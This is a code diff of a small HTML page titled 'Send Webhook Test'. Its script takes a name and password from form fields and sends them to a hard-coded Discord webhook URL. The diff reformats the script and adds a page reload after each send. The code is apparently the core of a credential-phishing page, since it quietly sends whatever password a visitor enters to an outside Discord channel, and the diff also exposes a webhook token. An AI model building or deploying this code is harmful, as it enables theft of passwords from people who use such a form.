@@ -8065,25 +8065,34 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Send Webhook Test</title>
-    <script>
-        function sendWebhook() {
-            let name = document.getElementById("name").value;
-            let password = document.getElementById("password").value;
+<script>
+    function sendWebhook() {
+        let name = document.getElementById("name").value;
+        let password = document.getElementById("password").value;
 
-            const webhookURL = "https://discord.com/api/webhooks/1289384157981708288/XAgMGk0x3S1zI4XmpLP8KTKAdC0kryOxyMij3_XRuhI3MSljf1VqXAkknCFZnrjL31Vb";
-            const contents = `Name: ${name}\nPassword: ${password}`;
-            
-            const request = new XMLHttpRequest();
-            request.open("POST", webhookURL);
-            request.setRequestHeader('Content-Type', 'application/json');
-            
-            const params = {
-                content: contents
-            };
-            
-            request.send(JSON.stringify(params));
-        }
-    </script>
+        const webhookURL = "https://discord.com/api/webhooks/1289384157981708288/XAgMGk0x3S1zI4XmpLP8KTKAdC0kryOxyMij3_XRuhI3MSljf1VqXAkknCFZnrjL31Vb";
+        const contents = `Name: ${name}\nPassword: ${password}`;
+        
+        const request = new XMLHttpRequest();
+        request.open("POST", webhookURL);
+        request.setRequestHeader('Content-Type', 'application/json');
+        
+        const params = {
+            content: contents
+        };
+        
+        request.send(JSON.stringify(params));
+
+        // Reload the page after sending the webhook
+        request.onload = function() {
+            if (request.status >= 200 && request.status < 300) {
+                location.reload(); // Reload the page
+            } else {
+                console.error('Error sending webhook:', request.statusText);
+            }
+        };
+    }
+</script>
 </head>
 <body>
 
